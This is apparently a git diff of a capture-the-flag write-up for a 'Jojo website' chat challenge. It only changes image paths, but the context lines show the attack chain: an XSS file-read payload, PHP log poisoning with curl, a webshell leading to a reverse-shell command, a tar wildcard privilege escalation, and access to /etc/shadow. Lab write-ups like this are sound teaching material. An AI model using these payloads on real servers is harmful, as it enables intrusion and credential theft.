@@ -19,7 +19,7 @@ We are facing a web application that allows us to send message, like a chat. We 
 
 When sending a message, the admin answers by saying hello.
 
-![Jojo Website home page](jojo_website_screen.png)
+![Jojo Website home page](imgs/jojo_website_screen.png)
 
 This platform includes some dead ends, so being exhaustive is necessary to find the different vulnerabilities that lead to pwn to whole server.
 
@@ -29,11 +29,11 @@ Before going further, we are going to need the absolute location of the web appl
 
 First of all, by having a look at request headers and at cookies, we can easily deduce that out application is a PHP one:
 
-![Request headers](headers.png)
+![Request headers](imgs/headers.png)
 
 Thus, we can try to mess with `PHPSESSID` cookie as a POST parameter in a request, in order to get an error message revealing the full path of the application.
 
-![[path_disclosure.png]]
+![Path Disclosure](imgs/path_disclosure.png)
 
 We now know that the full path of the `index.php` is `/var/www/jojo_website/html/index.php`.
 
@@ -44,13 +44,13 @@ Everywhere ? No! There is one place where username is not sanitized, which is in
 
 By creating an account with username being `<img src="x" onerror="document.write('XSS')" />`, we get this output when generating the PDF:
 
-![XSS POC 1](xss_poc1.png)
+![XSS POC 1](imgs/xss_poc1.png)
 
 From this output, we can conclude that out username got passed in a shell script, and certainly used in a `sed` command. Usually, the delimiter used in `sed` is `/`, so maybe out username is messing with this command.
 
 When trying again with an escaped version of our payload (`<img src="x" onerror="document.write('XSS')" \/>`), we get this:
 
-![XSS POC 2](xss_poc2.png)
+![XSS POC 2](imgs/xss_poc2.png)
 
 So we are able to execute javascript when generating the PDF. However, this does not mean that we are able to read arbitrary files in the machine, even if the presence of an image in the PDF allows us to think that we should be able to read files.
 
@@ -68,7 +68,7 @@ In order to try to read a file, we can use this payload for the username:
 
 We get this:
 
-![XSS Exploit](xss_exploit1.png)
+![XSS Exploit](imgs/xss_exploit1.png)
 
 So now, by changing the address of the file (for example, to `/var/www/jojo_website/html/index.php)`, we are able to read the whole PHP code of the web application. In `index.php`, we can read that pages are located in the `/var/www/jojo_website/html/inc` folder.
 
@@ -336,7 +336,7 @@ curl http://localhost/ -H "User-Agent: <?php system('whoami'); ?>"
 ```
 Then in the logs we can see:
 
-![RCE POC](rce_poc.png)
+![RCE POC](imgs/rce_poc.png)
 
 Therefore, we can execute RCE. 
 We can then write a webshell, and from that get a full reverse shell:
@@ -352,7 +352,7 @@ curl http://localhost/shell.php?cmd=%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%2
 
 And then we land into the server!
 
-![[revshell.png]]
+![Reverse shell](imgs/revshell.png)
 
 #### Step 5: Privilege escalation
 
@@ -370,13 +370,13 @@ tar -cf /root/jojo_backup.tar /var/log/apache2/jojo_log *
 
 By running `pspy`, we can see that this script gets executed every minute by `root`.
 
-![[pspy.png]]
+![pspy](imgs/pspy.png)
 
 So the script gets executed every minute, and logs are cleared every 5 minutes.
 
 The script contains a [tar wildcard vulnerability](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar) that should allow us to elevate our privileges.
 
-![TAR exploit](tar_exploit.png)
+![TAR exploit](imgs/tar_exploit.png)
 
 We can then access `/etc/shadow`, where we find `root` hash:
 ```
